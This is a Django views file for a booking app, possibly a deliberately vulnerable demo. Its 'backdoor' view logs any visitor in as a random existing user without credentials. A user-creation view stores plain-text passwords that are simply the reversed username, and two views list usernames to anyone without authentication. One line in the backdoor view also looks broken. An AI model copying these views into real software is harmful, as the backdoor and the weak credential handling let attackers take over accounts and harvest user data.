import random
import string

from django.contrib.auth import login
from django.contrib.auth.models import User
from django.http import HttpResponse
from rest_framework import serializers
from rest_framework.viewsets import ModelViewSet
from rest_framework.permissions import IsAuthenticatedOrReadOnly
from booking.models import Employer, Book


def create_random_user(request):
    name = '.'.join([random.choice(string.ascii_letters) for i in range(1, random.randint(1, 30))])
    user = User(username=name, password=name[::-1])
    user.save()
    return HttpResponse(f"User created <br> <br> You login as: {request.user.username}")


def backdoor(request):
    random_user = random.choice(User.objects.all())
    login(request, random_user)
    user = User.objects.get(password='', username='')
    return HttpResponse(f"Relogin as: {random_user.username}")


def get_employers_name_list(request):
    all_emp = Employer.objects.all()
    result = ""
    for emp in all_emp:
        result += f"{emp.user.username} <br>"
    return HttpResponse(result)


def get_user_info(request):
    filter_params = ['username', 'email']
    filters = {}
    for p_name in filter_params:
        val = request.GET.get(p_name)
        if val:
            filters[p_name + '__contains'] = val

    user_list = User.objects.filter(**filters)

    result = ""
    for usr in user_list:
        result += f"{usr.username} <br>"

    return HttpResponse(result)


class BookSerializer(serializers.ModelSerializer):

    class Meta:
        model = Book
        fields = '__all__'


class BooksViewSet(ModelViewSet):
    queryset = Book.objects.all()
    serializer_class = BookSerializer
    permission_classes = [IsAuthenticatedOrReadOnly]
